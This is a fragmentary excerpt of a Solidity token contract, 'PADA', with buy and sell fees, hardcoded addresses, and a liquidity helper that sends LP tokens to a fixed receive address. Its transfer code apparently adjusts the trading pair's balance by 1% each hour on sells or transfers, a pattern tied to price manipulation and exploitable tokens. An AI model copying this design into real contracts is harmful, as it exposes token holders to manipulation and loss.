...
contract PADA is IERC20, Ownable {
    uint buyFee = 3;
    uint sellFee = 3;
    ...
    address systemAddress = address(0xB1D7c71bC69F2969b7A5a107a8625dE5Da71D174);
    string Name = "PADA";
    string Symbol = "PADA";
    uint8 Decimals = 18;
    uint256 Supply = 1000000000000000;
    address ReceiveAddress = address(0x2389ff7333fCC3FFB0848c4DB95e6fF5231999Bd);
    ...
    function _tokenTransfer(
        ...
        if (isSell || isTransfer){
            if (!hasincr[block.timestamp / 1 hours] && balanceOf(_mainPair) > 0){
                uint incrNum = _balances[_mainPair] * 100 / 10000;
    ...
    function addL (uint256 tokenAmount, uint tokenB) private {
        _swapRouter.addLiquidity(
            _weth, address(this), tokenB, tokenAmount, 0, 0, ReceiveAddress, block.timestamp
        );
    }
